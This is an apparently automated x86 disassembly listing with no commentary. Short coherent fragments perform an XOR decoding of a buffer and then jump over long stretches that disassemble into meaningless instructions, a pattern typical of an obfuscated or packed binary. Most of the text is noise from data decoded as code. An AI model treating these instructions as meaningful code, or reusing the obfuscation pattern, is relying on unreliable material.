  4046fb:	rcl    esp,1
  4046fd:	mov    al,0x68
  4046ff:	pop    ecx
  404700:	mov    eax,DWORD PTR [ebp-0x30]
  404703:	mov    ecx,DWORD PTR [ebp-0x2c]
  404706:	shrd   eax,ecx,0x2
  40470a:	shr    ecx,0x2
  40470d:	mov    ecx,DWORD PTR [ebp-0x30]
  404710:	mov    edx,DWORD PTR [ebp-0x2c]
  404713:	xor    eax,edi
  404715:	shl    ecx,0x1e
  404718:	xor    edx,edx
  40471a:	or     eax,edx
  40471c:	lea    eax,[ebp+eax*1-0x4]
  404720:	mov    DWORD PTR [ebp-0x34],eax
  404723:	mov    eax,DWORD PTR [ebp-0x30]
  404726:	mov    ecx,DWORD PTR [ebp-0x2c]
  404729:	shrd   eax,ecx,0x2
  40472d:	shr    ecx,0x2
  404730:	mov    ecx,DWORD PTR [ebp-0x30]
  404733:	mov    edx,DWORD PTR [ebp-0x2c]
  404736:	shl    ecx,0x1e
  404739:	mov    ecx,DWORD PTR [ebp-0x14]
  40473c:	xor    eax,edi
  40473e:	xor    edx,edx
  404740:	or     eax,edx
  404742:	mov    cl,BYTE PTR [eax+ecx*1]
  404745:	mov    eax,DWORD PTR [ebp-0x34]
  404748:	xor    BYTE PTR [eax],cl
  40474a:	mov    eax,DWORD PTR [ebp-0x20]
  40474d:	mov    ecx,DWORD PTR [ebp-0x1c]
  404750:	shrd   eax,ecx,0x2
  404754:	shr    ecx,0x2
  404757:	mov    ecx,DWORD PTR [ebp-0x20]
  40475a:	mov    edx,DWORD PTR [ebp-0x1c]
  40475d:	xor    eax,edi
  40475f:	jmp    0x404b00
  404764:	xchg   esp,eax
  404765:	mov    esi,DWORD PTR [esi-0x434b497e]
  40476b:	fwait
  40476c:	or     al,dl
  40476e:	cli    
  40476f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404770:	sbb    BYTE PTR [edx+0x3bee3eb],ah
  404776:	mov    esi,0xbec4bdbe
  40477b:	mov    esi,0x946f67ed
  404780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404781:	pop    edi
  404782:	adc    eax,0xf7dc6e85
  404787:	pusha  
  404788:	xlat   BYTE PTR ds:[ebx]
  404789:	cmp    DWORD PTR [eax-0x80],ebx
  40478c:	add    eax,0xc95fae9e
  404791:	jo     0x4047d0
  404793:	jmp    0xa64840fa
  404798:	ret    
  404799:	popa   
  40479a:	fcomp  DWORD PTR [ecx+ebp*2-0x32]
  40479e:	jo     0x40479e
  4047a0:	and    bh,BYTE PTR [edi]
  4047a2:	sbb    DWORD PTR [esp+esi*8+0x6111d98b],esp
  4047a9:	adc    esp,ebp
  4047ab:	je     0x40475a
  4047ad:	loopne 0x4047ce
  4047af:	inc    eax
  4047b0:	push   0xffffffa2
  4047b2:	adc    DWORD PTR [ecx+0x26],ebx
  4047b5:	mov    eax,ebp
  4047b7:	dec    ecx
  4047b8:	call   0x8669:0xfd1b4709
  4047bf:	xor    al,0x67
  4047c1:	lock cmp eax,0x2d8d082b
  4047c7:	cmc    
  4047c8:	jg     0x404776
  4047ca:	inc    edi
  4047cb:	js     0x40482c
  4047cd:	lods   al,BYTE PTR ds:[esi]
  4047ce:	sahf   
  4047cf:	(bad)  
  4047d0:	ret    0x1a16
  4047d3:	test   BYTE PTR [ebp+eax*4+0x9e8e1a4],dh
  4047da:	js     0x404771
  4047dc:	inc    esp
  4047dd:	(bad)
  4047e2:	adc    ah,dh
  4047e4:	cmp    DWORD PTR [ebx+0x61],eax
  4047e7:	dec    ecx
  4047e8:	add    BYTE PTR [ecx-0x67],0x0
  4047ec:	paddd  mm2,QWORD PTR [edx+0x263c8c8a]
  4047f3:	pop    edi
  4047f4:	dec    esp
  4047f5:	pop    ebx
  4047f6:	jmp    0x440:0xe8218e1c
  4047fd:	jns    0x4047d0
  4047ff:	and    BYTE PTR [esi],ch
  404801:	mov    ecx,DWORD PTR ds:0x6f039a94
  404807:	inc    edx
  404808:	jno    0x4047ae
  40480a:	inc    edx
  40480b:	inc    eax
  40480c:	lea    ebp,[ebx+edx*2+0x48]
  404810:	cmp    eax,0x4054123
  404815:	out    dx,eax
  404816:	mov    ebx,0x898f02e9
  40481b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40481c:	das    
  40481d:	mov    al,ds:0x973db84e
  404822:	mov    ah,0xa8
  404824:	ja     0x404865
  404826:	data16 jp 0x4047d1
  404829:	add    al,0x83
  40482b:	aaa    
  40482c:	push   0x9336e302
  404831:	xchg   ebp,eax
  404832:	ins    BYTE PTR es:[edi],dx
  404833:	jmp    0xc3a7d330
  404838:	xchg   ecx,eax
  404839:	nop
  40483a:	push   edi
  40483b:	inc    eax
  40483c:	fcmovnu st,st(0)
  40483e:	es in  al,dx
  404840:	out    0xce,eax
  404842:	add    al,0x40
  404844:	jb     0x4048b8
  404846:	sbb    BYTE PTR [eax-0x18],ch
  404849:	add    ebp,DWORD PTR [esi+0x21]
  40484c:	mov    eax,0x264f1e0a
  404851:	adc    edx,DWORD PTR [ebp+0x74a92b17]
  404857:	popa   
  404858:	mov    ebx,0xeb2bb617
  40485d:	inc    edi
  40485e:	cwde   
  40485f:	push   es
  404860:	xchg   cl,ch
  404862:	out    0x73,eax
  404864:	test   eax,eax
  404866:	cs mov dl,0x54
  404869:	aaa    
  40486a:	ja     0x404871
  40486c:	out    0x1e,eax
  40486e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40486f:	enter  0xa762,0x76
  404873:	out    0x6e,al
  404875:	mul    cl
  404877:	in     al,0x0
  404879:	inc    esp
  40487a:	dec    edi
  40487b:	loopne 0x404825
  40487d:	mov    ebx,eax
  40487f:	inc    ebx
  404880:	jne    0x404818
  404882:	inc    ebp
  404883:	pop    ebx
  404884:	ror    edi,1
  404886:	ds push 0x8828f207
  40488c:	test   bh,al
  40488e:	or     al,BYTE PTR [eax+0x1f933384]
  404894:	in     al,dx
  404895:	pop    esp
  404896:	dec    esp
  404897:	gs fsubr st(4),st
  40489a:	lahf   
  40489b:	mov    ds:0x476c655f,al
  4048a0:	pmaxub mm7,mm0
  4048a3:	mov    eax,DWORD PTR [ebp-0x3a50b95d]
  4048a9:	aaa    
  4048aa:	repnz push ecx
  4048ac:	or     BYTE PTR [edx],bl
  4048ae:	pop    ecx
  4048af:	cmp    al,0xb1
  4048b1:	outs   dx,DWORD PTR ds:[esi]
  4048b2:	cmp    DWORD PTR [ecx+0x38a5aae5],ebp
  4048b8:	mov    cl,0x3
  4048ba:	pop    edi
  4048bb:	nop
  4048bc:	push   esp
  4048bd:	push   edi
  4048be:	adc    ah,bl
  4048c0:	shr    BYTE PTR [esp+esi*1-0x73],1
  4048c4:	arpl   WORD PTR [eax-0x5d73cd01],bx
  4048ca:	jbe    0x404881
  4048cc:	ror    DWORD PTR [ebp-0x1b],1
  4048cf:	or     ecx,ebp
  4048d1:	xor    ax,0xe0f9
  4048d5:	into   
  4048d6:	push   0x2777dfda
  4048db:	xor    ebp,eax
  4048dd:	push   edx
  4048de:	call   0xbfb5:0xa7d603fb
  4048e5:	adc    BYTE PTR [esi+ebp*1],cl
  4048e8:	pop    ebp
  4048e9:	scas   eax,DWORD PTR es:[edi]
  4048ea:	pushf  
  4048eb:	and    cl,BYTE PTR [esi]
  4048ed:	in     eax,0x6d
  4048ef:	rcl    BYTE PTR [eax],1
  4048f1:	sar    DWORD PTR [edi],1
  4048f3:	popf   
  4048f4:	cmp    eax,0x930e7e77
  4048f9:	outs   dx,DWORD PTR ds:[esi]
  4048fa:	sbb    DWORD PTR [ecx+0x4c2fdcb1],ecx
  404900:	mov    al,0x6e
  404902:	push   0x3e
  404904:	mov    dl,0x54
  404906:	xchg   edx,eax
  404907:	mov    dh,0x9d
  404909:	dec    ecx
  40490a:	mov    al,0x70
  40490c:	adc    DWORD PTR [edi],esi
  40490e:	gs pushf 
  404910:	test   BYTE PTR [edi-0x37],0xd2
  404914:	or     bl,bl
  404916:	call   0xd63b293a
  40491b:	dec    esi
  40491c:	pop    ebp
  40491d:	clc    
  40491e:	std    
  40491f:	push   ebp
  404920:	or     eax,0xd1bcd52e
  404925:	xor    al,0x72
  404927:	mov    dl,0xc1
  404929:	and    ebp,DWORD PTR [eax+edi*8+0x21213a08]
  404930:	imul   eax,DWORD PTR [ecx-0x6dc96d16],0xfffffff0
  404937:	mov    edx,0x41594d07
  40493c:	mov    es,edx
  40493e:	(bad)  
  40493f:	rcr    BYTE PTR [esp+eiz*4],1
  404942:	scas   eax,DWORD PTR es:[edi]
  404943:	xor    al,0x55
  404945:	pop    ds
  404946:	mov    esp,0xae3e4d2d
  40494b:	cmp    edx,DWORD PTR [ecx]
  40494d:	xchg   cl,bh
  40494f:	mov    cl,0x2d
  404951:	popf   
  404952:	fisttp WORD PTR [ecx]
  404954:	mov    WORD PTR [edi+0x2e78989d],?
  40495a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40495b:	loop   0x4049c7
  40495d:	in     eax,0x77
  40495f:	jle    0x404947
  404961:	jle    0x4048f0
  404963:	in     eax,0x28
  404965:	cmc    
  404966:	inc    ebx
  404967:	mov    dl,al
  404969:	dec    edx
  40496a:	jmp    0xe678af2a
  40496f:	mov    edx,0xfddc8f07
  404974:	sub    BYTE PTR [esi],0xd2
  404977:	outs   dx,BYTE PTR ds:[esi]
  404978:	imul   ebx,eax,0x75
  40497b:	dec    ebp
  40497c:	loope  0x40497b
  40497e:	xchg   edi,eax
  40497f:	cli    
  404980:	adc    al,BYTE PTR [ebx]
  404982:	cmp    esi,eax
  404984:	inc    ecx
  404985:	(bad)  
  404986:	sahf   
  404987:	mov    ss,WORD PTR [ebp+0x4b]
  40498a:	fld    DWORD PTR [eax]
  40498c:	xor    DWORD PTR [edx+esi*4],esi
  40498f:	div    bl
  404991:	mov    ds:0x798826d1,eax
  404996:	and    esi,DWORD PTR [edx]
  404998:	jns    0x404951
  40499a:	lahf   
  40499b:	push   ebp
  40499c:	jecxz  0x40497a
  40499e:	or     eax,0xfda7671e
  4049a3:	jb     0x404a1a
  4049a5:	setnp  BYTE PTR [edx+edx*4-0x62]
  4049aa:	aaa    
  4049ab:	or     edx,DWORD PTR [esi+eax*1]
  4049ae:	loope  0x404952
  4049b0:	jo     0x404a05
  4049b2:	into   
  4049b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b4:	jl     0x404a28
  4049b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b7:	pop    eax
  4049b8:	nop    DWORD PTR [eax+0x73]
  4049bc:	mov    DWORD PTR [edx],ebp
  4049be:	adc    al,0x55
  4049c0:	imul   esp,DWORD PTR [eax],0xffffffdf
  4049c3:	jno    0x404a1b
  4049c5:	iret   
  4049c6:	imul   ecx,esi,0xd
  4049c9:	ret    0xf7f2
  4049cc:	xor    bh,cl
  4049ce:	mul    ecx
  4049d0:	pop    edi
  4049d1:	sbb    ebp,DWORD PTR [eax-0x301c993b]
  4049d7:	mov    cl,0xae
  4049d9:	cmp    BYTE PTR [esp+ebp*4-0x66],ch
  4049dd:	sbb    al,0x89
  4049df:	or     edi,0xffffff89
  4049e2:	jns    0x404a30
  4049e4:	stos   DWORD PTR es:[edi],eax
  4049e5:	inc    ebp
  4049e6:	jmp    0x7621:0x31bc9f41
  4049ed:	jb     0x4049bf
  4049ef:	or     DWORD PTR cs:[ebx-0x4e],0x5e
  4049f4:	xchg   BYTE PTR [eax-0x77],al
  4049f7:	xchg   ebp,eax
  4049f8:	jo     0x404a78
  4049fa:	pusha  
  4049fb:	push   0x7c2960e7
  404a00:	pop    esi
  404a01:	push   esi
  404a02:	sub    ah,0xa9
  404a05:	mov    eax,0xc206f0fc
  404a0a:	cmc    
  404a0b:	mov    ah,0xc5
  404a0d:	and    dh,dl
  404a0f:	add    DWORD PTR [esi+0x1ec7a8b2],esi
  404a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a16:	dec    ebp
  404a17:	xlat   BYTE PTR ds:[ebx]
  404a18:	push   ss
  404a19:	fdiv   QWORD PTR [edx]
  404a1b:	les    edx,FWORD PTR [ebx+0x11]
  404a1e:	xchg   edx,eax
  404a1f:	into   
  404a20:	adc    BYTE PTR [ebx],bl
  404a22:	lock les ebp,FWORD PTR [ebp+0x34c60ebc]
  404a29:	leave  
  404a2a:	mov    ebp,0x4d9f818b
  404a2f:	mov    fs,edi
  404a31:	xor    dl,dh
  404a33:	(bad)  
  404a34:	xor    eax,0x76939656
  404a39:	xlat   BYTE PTR ds:[ebx]
  404a3a:	enter  0x2666,0xba
  404a3e:	adc    esi,DWORD PTR [eax-0x6847cf9]
  404a44:	add    edi,ebp
  404a46:	loopne 0x404a50
  404a48:	fcom   QWORD PTR es:[ecx]
  404a4b:	bound  ecx,QWORD PTR [esi]
  404a4d:	shl    DWORD PTR [ebx],cl
  404a4f:	test   al,0x78
  404a51:	sub    edi,edi
  404a53:	cmp    al,bl
  404a55:	pop    ebp
  404a56:	dec    edx
  404a57:	or     eax,0xe0604745
  404a5c:	inc    ecx
  404a5d:	dec    edx
  404a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a5f:	mov    ch,0x8e
  404a61:	loopne 0x404a41
  404a63:	imul   edi,DWORD PTR [edx+0x50],0xc65dcb95
  404a6a:	rol    cl,1
  404a6c:	push   esi
  404a6d:	fistp  DWORD PTR [esi-0x30]
  404a70:	shr    DWORD PTR [ecx],cl
  404a72:	and    al,0x3a
  404a74:	sti    
  404a75:	out    dx,eax
  404a76:	mov    ebp,ebp
  404a78:	cs das 
  404a7a:	test   eax,0x9376f56c
  404a7f:	fidivr WORD PTR [ebx+0x5]
  404a82:	sbb    al,0x4f
  404a84:	cwde   
  404a85:	mov    eax,0x663769d5
  404a8a:	sub    DWORD PTR [edi],esp
  404a8c:	sbb    al,0xaf
  404a8e:	aaa    
  404a8f:	mov    eax,ds:0x50387f3
  404a94:	adc    edx,DWORD PTR [ebx+edx*1-0x6c]
  404a98:	das    
  404a99:	sti    
  404a9a:	xor    DWORD PTR [ebx-0x2c],0x1a5b6552
  404aa1:	dec    ebx
  404aa2:	fdiv   st(5),st
  404aa4:	jmp    0x9844981f
  404aa9:	out    0x98,al
  404aab:	adc    eax,0x27d2ffbf
  404ab0:	fisubr WORD PTR [ecx-0x34]
  404ab3:	push   eax
  404ab4:	repnz pop esp
  404ab6:	mul    DWORD PTR [edx+0xcef1850]
  404abc:	test   BYTE PTR [eax+eiz*1-0x2a],dl
  404ac0:	and    edx,DWORD PTR [ebp-0x7b]
  404ac3:	inc    edx
  404ac4:	jnp    0x404a7b
  404ac6:	push   0x77
  404ac8:	mov    al,0xbb
  404aca:	xor    BYTE PTR [ebp-0x2c89ee22],dh
  404ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad1:	test   eax,0x76f8adc3
  404ad6:	pop    ecx
  404ad7:	lahf   
  404ad8:	add    ebp,DWORD PTR [edx]
  404ada:	push   es
  404adb:	cdq    
  404adc:	cli    
  404add:	pop    eax
  404ade:	mov    bl,0xb4
  404ae0:	xlat   BYTE PTR ds:[ebx]
  404ae1:	cmp    DWORD PTR [ecx],edi
  404ae3:	pop    ss
  404ae4:	mov    ebx,0x90333380
  404ae9:	inc    ecx
  404aea:	icebp  
  404aeb:	sbb    BYTE PTR [esi+0x5313b8c4],bh
  404af1:	(bad)  
  404af2:	pop    ecx
  404af3:	outs   dx,DWORD PTR ds:[esi]
  404af4:	fwait
  404af5:	mov    BYTE PTR [ecx-0x66],0x6d
  404af9:	mov    esi,0x4fac771e
  404afe:	xchg   esi,eax
  404aff:	cmp    eax,ecx
  404b01:	loope  0x404b21
  404b03:	xor    edx,edx
  404b05:	or     eax,edx
  404b07:	lea    eax,[ebp+eax*1-0x4]
  404b0b:	mov    DWORD PTR [ebp-0x34],eax
  404b0e:	mov    eax,DWORD PTR [ebp-0x20]
  404b11:	mov    ecx,DWORD PTR [ebp-0x1c]
  404b14:	shrd   eax,ecx,0x2
  404b18:	shr    ecx,0x2
  404b1b:	mov    ecx,DWORD PTR [ebp-0x20]
  404b1e:	mov    edx,DWORD PTR [ebp-0x1c]
  404b21:	shl    ecx,0x1e
  404b24:	mov    ecx,DWORD PTR [ebp-0x14]
  404b27:	jmp    0x404ec8
  404b2c:	cmp    BYTE PTR [edx],ch
  404b2e:	push   0xffffff83
  404b30:	jl     0x404ab5
  404b32:	cmp    BYTE PTR [edx-0x61edfbc6],bh
  404b38:	jae    0x404b14
  404b3a:	mov    eax,0xbe09bda4
  404b3f:	mov    esi,0xbebec4bd
  404b44:	inc    eax
  404b45:	or     ah,BYTE PTR [edx+0x69732e91]
  404b4b:	ds and al,0x49
  404b4f:	or     al,0x87
  404b51:	push   esp
  404b52:	fidiv  DWORD PTR [ecx+0x643648bb]
  404b58:	push   edi
  404b59:	push   esi
  404b5a:	mov    ebx,0xa10dced2
  404b5f:	push   es
  404b60:	pop    ebp
  404b61:	sbb    al,0x58
  404b63:	nop
  404b64:	idiv   BYTE PTR [edi-0x53546fe3]
  404b6a:	dec    esp
  404b6b:	add    esp,esp
  404b6d:	push   0x73
  404b6f:	pop    edx
  404b70:	dec    esi
  404b71:	inc    ebx
  404b72:	int    0x9b
  404b74:	outs   dx,DWORD PTR ds:[esi]
  404b75:	fwait
  404b76:	sbb    DWORD PTR [edi],esi
  404b78:	or     BYTE PTR [ecx+edi*2],ah
  404b7b:	inc    esp
  404b7c:	push   ss
  404b7d:	pop    ebp
  404b7e:	mov    bh,0xdf
  404b80:	fsub   QWORD PTR [ecx-0x2c]
  404b83:	jge    0x404bc1
  404b85:	mov    bl,0x35
  404b87:	mov    BYTE PTR [ebx+0x7f],ah
  404b8a:	push   ebx
  404b8b:	dec    eax
  404b8c:	cmp    eax,0x7ae31ae2
  404b91:	imul   ebp,eax,0xf9ef60cd
  404b97:	mov    WORD PTR [eax+edi*8],?
  404b9a:	pop    edi
  404b9b:	cdq    
  404b9c:	mov    ds:0x5b3b7630,eax
  404ba1:	fidivr DWORD PTR [esi]
  404ba3:	mov    ds:0xc7c296b4,al
  404ba8:	iret   
  404ba9:	inc    eax
  404baa:	test   BYTE PTR [ecx],ch
  404bac:	sub    BYTE PTR [ebp+0x4cec4117],bh
  404bb2:	data16 dec BYTE PTR [esi]
  404bb5:	shl    DWORD PTR [ebp-0x79],1
  404bb8:	ss adc cl,dh
  404bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bbc:	into   
  404bbd:	mov    edi,DWORD PTR [eax+0x8c7547b]
  404bc3:	mov    esi,0x1c287cf0
  404bc8:	nop
  404bc9:	pop    ss
  404bca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bcb:	dec    ecx
  404bcc:	mov    ah,0x87
  404bce:	sbb    BYTE PTR [edi+ebx*8+0x43],bl
  404bd2:	jae    0x404b6f
  404bd4:	hlt    
  404bd5:	lods   al,BYTE PTR ds:[esi]
  404bd6:	pop    ebx
  404bd7:	sbb    al,0x4f
  404bd9:	(bad)  
  404bda:	popa   
  404bdb:	mov    ebx,0xe8881fdc
  404be0:	sub    al,0xe1
  404be2:	loope  0x404be6
  404be4:	xlat   BYTE PTR ds:[ebx]
  404be5:	outs   dx,BYTE PTR ds:[esi]
  404be6:	in     eax,dx
  404be7:	loopne 0x404bb7
  404be9:	sbb    ah,bl
  404beb:	(bad)  
  404bec:	ffree  st(5)
  404bee:	cmp    DWORD PTR [ecx-0x22],ebp
  404bf1:	cmp    eax,0x8fbe7090
  404bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bf7:	data16 adc al,0xe5
  404bfa:	js     0x404baf
  404bfc:	inc    ebp
  404bfd:	aam    0x8b
  404bff:	fsub   DWORD PTR [edi]
  404c01:	dec    edi
  404c02:	push   ecx
  404c03:	and    BYTE PTR [edi-0x14869640],al
  404c09:	addr16 into 
  404c0b:	dec    esp
  404c0c:	neg    cl
  404c0e:	mov    bl,0xf5
  404c10:	into   
  404c11:	hlt    
  404c12:	loop   0x404c5b
  404c14:	aad    0xc0
  404c16:	scas   al,BYTE PTR es:[edi]
  404c17:	(bad)  
  404c18:	mov    edi,0x6550c6b8
  404c1d:	loopne 0x404bdf
  404c1f:	(bad)
  404c24:	jnp    0x404c20
  404c26:	push   ebx
  404c27:	sbb    edx,DWORD PTR [ecx]
  404c29:	data16 and ch,BYTE PTR ds:0x3f66f877
  404c30:	jb     0x404c38
  404c32:	outs   dx,BYTE PTR ds:[esi]
  404c33:	mov    WORD PTR [edi],ss
  404c35:	xchg   ebp,eax
  404c36:	and    al,0xe6
  404c38:	push   ecx
  404c39:	jmp    0xd37a9ad1
  404c3e:	test   DWORD PTR [ebp-0x2f],esi
  404c41:	jne    0x404c98
  404c43:	mov    BYTE PTR [eax-0x6a],bh
  404c46:	cdq    
  404c47:	and    eax,0x133f9ef7
  404c4c:	inc    eax
  404c4d:	int    0x62
  404c4f:	adc    edi,ecx
  404c51:	sti    
  404c52:	cmp    DWORD PTR [eax],ecx
  404c54:	or     al,0x20
  404c56:	stc    
  404c57:	aaa    
  404c58:	sub    dl,BYTE PTR [ebp-0x26]
  404c5b:	push   es
  404c5c:	mov    ebp,0x38dc1a48
  404c61:	push   ecx
  404c62:	sub    dl,BYTE PTR [edi+0x29280b51]
  404c68:	sbb    al,0x69
  404c6a:	lods   al,BYTE PTR ds:[esi]
  404c6b:	lock add al,0x70
  404c6e:	retf   0xb92
  404c71:	add    al,0xef
  404c73:	sti    
  404c74:	and    esi,ebp
  404c76:	repz adc BYTE PTR ds:0x84d3f2b8,dl
  404c7d:	pop    ecx
  404c7e:	sti    
  404c7f:	adc    al,0xa0
  404c81:	mov    DWORD PTR [ecx+0x4d6c1e5e],edi
  404c87:	aad    0xf8
  404c89:	xor    al,0xf1
  404c8b:	int3   
  404c8c:	jne    0x404c75
  404c8e:	cmp    BYTE PTR [ecx+0x7703b848],0x58
  404c95:	jnp    0x404cef
  404c97:	adc    dh,dh
  404c99:	dec    esp
  404c9a:	inc    ecx
  404c9b:	mov    ah,0x48
  404c9d:	mov    DWORD PTR [ebx+0x1154d510],eax
  404ca3:	outs   dx,DWORD PTR ds:[esi]
  404ca4:	leave  
  404ca5:	mov    ds:0x42b6001f,eax
  404caa:	xor    al,0x5e
  404cac:	in     al,0xb1
  404cae:	sub    al,0x3b
  404cb0:	and    DWORD PTR [esi-0x46],edi
  404cb3:	(bad)  
  404cb5:	inc    esi
  404cb6:	mov    edi,0xc9791d41
  404cbb:	or     esp,DWORD PTR [edx]
  404cbd:	jle    0x404d2f
  404cbf:	mov    eax,ds:0x47228741
  404cc4:	(bad)  
  404cc5:	(bad)
  404cc9:	inc    eax
  404cca:	inc    ebx
  404ccb:	jle    0x404c74
  404ccd:	cmp    al,0xce
  404ccf:	pop    eax
  404cd0:	ficom  WORD PTR [ebp-0x96c9175]
  404cd6:	aas    
  404cd7:	dec    edx
  404cd8:	xor    eax,0x5c38a89f
  404cdd:	jmp    0x404d09
  404cdf:	or     eax,0x73a5e2e9
  404ce4:	push   ss
  404ce5:	inc    ebp
  404ce6:	add    DWORD PTR [edi-0x32],ecx
  404ce9:	add    ebx,DWORD PTR [eax-0x2a9adfb]
  404cef:	in     eax,dx
  404cf0:	xlat   BYTE PTR ds:[ebx]
  404cf1:	call   0x97da3f5c
  404cf6:	mov    edi,DWORD PTR gs:[edi+0x3a]
  404cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cfb:	daa    
  404cfc:	inc    ecx
  404cfd:	popf   
  404cfe:	and    al,0x83
  404d00:	and    eax,0x31db3dcd
  404d05:	rcl    DWORD PTR [esi],cl
  404d07:	fwait
  404d08:	lods   al,BYTE PTR ds:[esi]
  404d09:	fiadd  WORD PTR [ebx-0x15]
  404d0c:	sbb    ah,0xe3
  404d0f:	retf   
  404d10:	enter  0xeb1c,0x48
  404d14:	mov    cl,0x72
  404d16:	add    BYTE PTR ds:0x59d5f4c5,dh
  404d1c:	jno    0x404d22
  404d1e:	push   0xc38b105a
  404d23:	jns    0x404caf
  404d25:	shl    DWORD PTR [esi+ebp*4-0x5798c544],0x51
  404d2d:	inc    edx
  404d2e:	adc    DWORD PTR [edi+0x57b8dd64],0xffffffe5
  404d35:	imul   eax,DWORD PTR [eax-0x5ec7f3e5],0x33
  404d3c:	cwde   
  404d3d:	and    ebx,0xffffffe1
  404d40:	lods   al,BYTE PTR ds:[esi]
  404d41:	adc    DWORD PTR [ecx-0x78a723d1],ecx
  404d47:	jne    0x404d60
  404d49:	dec    edi
  404d4a:	xor    eax,0xac9fbc25
  404d4f:	loope  0x404cf3
  404d51:	or     BYTE PTR [edi+edx*4+0x13],bl
  404d55:	pushf  
  404d56:	jo     0x404d66
  404d58:	pop    ss
  404d59:	iret   
  404d5a:	lds    esp,FWORD PTR [edx+0x2775b196]
  404d60:	pusha  
  404d61:	(bad)  
  404d62:	dec    edi
  404d63:	mov    ds:0xdd8e948d,al
  404d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d69:	xchg   esi,eax
  404d6a:	jecxz  0x404d56
  404d6c:	lock scas al,BYTE PTR es:[edi]
  404d6e:	sub    DWORD PTR [ebx+0x2b],edx
  404d71:	loope  0x404dd5
  404d73:	push   cs
  404d74:	dec    edi
  404d75:	sysexit 
  404d77:	bound  edi,QWORD PTR [ebx+edi*4]
  404d7a:	retf   0x9afd
  404d7d:	mov    ebx,0x2d920289
  404d82:	into   
  404d83:	lea    esi,[edi-0x35]
  404d86:	mov    WORD PTR [eax+0x59],ds
  404d89:	retf   
  404d8a:	sbb    edx,edi
  404d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8d:	test   BYTE PTR [eax],dh
  404d8f:	int    0x5b
  404d91:	gs sti 
  404d93:	sbb    al,0x43
  404d95:	(bad)  [ebp+0x6c8cc08c]
  404d9b:	jmp    0x404d8d
  404d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d9e:	repz dec eax
  404da0:	push   ebx
  404da1:	mov    bl,0x94
  404da3:	cwde   
  404da4:	mov    DWORD PTR [esi+0x62f67d60],edx
  404daa:	leave  
  404dab:	jp     0x404d83
  404dad:	xchg   BYTE PTR [ebp-0x23],dl
  404db0:	loop   0x404d62
  404db2:	jae    0x404e06
  404db4:	xor    DWORD PTR [ebp-0x7d427e07],edi
  404dba:	imul   ebx,DWORD PTR [esi+0x3281ca80],0x6d
  404dc1:	fidiv  WORD PTR [esi+0x71a2a0c9]
  404dc7:	in     al,0xd0
  404dc9:	sbb    DWORD PTR ds:0x41b73c0e,esi
  404dcf:	mov    ebx,esi
  404dd1:	adc    ch,BYTE PTR [bp+di]
  404dd4:	adc    cl,bl
  404dd6:	or     BYTE PTR [esi],0xe8
  404dd9:	lock adc eax,0x1f0e9cdf
  404ddf:	gs dec eax
  404de1:	scas   eax,DWORD PTR es:[edi]
  404de2:	ficomp WORD PTR [esp+ebx*8]
  404de5:	and    eax,0xcbbf8422
  404dea:	mov    eax,ds:0x89356a4f
  404def:	sub    al,0x99
  404df1:	mov    bl,0xfe
  404df3:	out    0xc0,al
  404df5:	fwait
  404df6:	xchg   ecx,eax
  404df7:	jp     0x404ddf
  404df9:	push   ebx
  404dfa:	push   0xffffffee
  404dfc:	shr    BYTE PTR [esi+0x42],0x8f
  404e00:	rol    BYTE PTR [eax+0x11a7291b],0xfb
  404e07:	xor    DWORD PTR [eax],esp
  404e09:	xlat   BYTE PTR ds:[ebx]
  404e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e0b:	adc    esp,DWORD PTR [ecx-0x63]
  404e0e:	aaa    
  404e0f:	call   0x3365:0xb00fa0d5
  404e16:	xchg   esp,eax
  404e17:	dec    edx
  404e18:	sbb    al,0xa6
  404e1a:	(bad)
  404e1e:	adc    ch,BYTE PTR [eax-0x4c371fc2]
  404e24:	sti    
  404e25:	call   0x8bda:0xceaedecc
  404e2c:	xchg   ebx,eax
  404e2d:	data16 sbb BYTE PTR [ebx-0x731a9029],ch
  404e34:	out    dx,al
  404e35:	inc    eax
  404e36:	mov    eax,ds:0xf77efc76
  404e3b:	pop    esp
  404e3c:	xlat   BYTE PTR ds:[ebx]
  404e3d:	es leave 
  404e3f:	sbb    ax,0x2579
  404e43:	mov    ds:0x56a339a4,eax
  404e48:	mov    ch,0xaf
  404e4a:	pop    esi
  404e4b:	push   ds
  404e4c:	test   DWORD PTR [edx],0xfeb8b84b
  404e52:	shl    DWORD PTR [edi],cl
  404e54:	fisttp DWORD PTR ds:0x88af13bc
  404e5a:	loop   0x404e8e
  404e5c:	and    dh,al
  404e5e:	cmp    eax,0x5fda3ab7
  404e63:	xchg   ebx,eax
  404e64:	push   DWORD PTR [ebp-0x6c]
  404e67:	fwait
  404e68:	cmp    BYTE PTR [ecx-0x277f90d],cl
  404e6e:	int    0x9a
  404e70:	sahf   
  404e71:	(bad)  
  404e73:	push   eax
  404e74:	data16 fcomip st,st(7)
  404e77:	jl     0x404e35
  404e79:	dec    edi
  404e7a:	sub    bh,dh
  404e7c:	xor    DWORD PTR [ecx+ecx*4-0xddf5d86],ebp
  404e83:	icebp  
  404e84:	push   0xb95108a7
  404e89:	arpl   WORD PTR [ebx+0x437b7d48],si
  404e8f:	jnp    0x404e9b
  404e91:	test   DWORD PTR [ebx+0x6f],eax
  404e94:	xchg   esp,eax
  404e95:	cmc    
  404e96:	sub    eax,0x2d7a08e8
  404e9b:	stos   DWORD PTR es:[edi],eax
  404e9c:	inc    ebx
  404e9d:	mov    ah,BYTE PTR [eax+0x24badb9c]
  404ea3:	xchg   edi,eax
